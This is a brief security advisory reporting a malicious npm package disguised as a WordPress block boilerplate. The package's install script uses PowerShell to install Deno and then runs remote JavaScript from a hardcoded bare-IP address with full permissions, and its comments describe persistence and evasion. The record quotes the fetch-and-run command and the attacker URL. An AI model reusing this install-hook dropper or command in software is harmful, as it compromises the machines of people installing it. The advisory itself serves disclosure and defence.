summary: npm install lifecycle stages Deno-based dropper fetching remote JS from bare IP
details: package.json declares an `install` lifecycle script `node setup.js`. setup.js contains a PowerShell payload that installs Scoop, winget, and the Deno runtime, then executes `deno run -A` against `http://172.94.9.157/v028f8cde892b0b74c8.js` — remote JavaScript fetched over plain HTTP from a hardcoded bare IP, run with all permissions on the installer's host. Inline comments in setup.js describe a multi-stage launcher chain in which launcher-1 fetches launcher-2 to 'set up autorun and run main', and note that 'no disk file [is] written by our code, only Deno's URL cache populates' — cover language for establishing persistence while evading on-disk forensics. The advertised purpose is a WordPress Gutenberg/Tailwind block boilerplate, which has no legitimate need for an alternate runtime or remote script execution.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
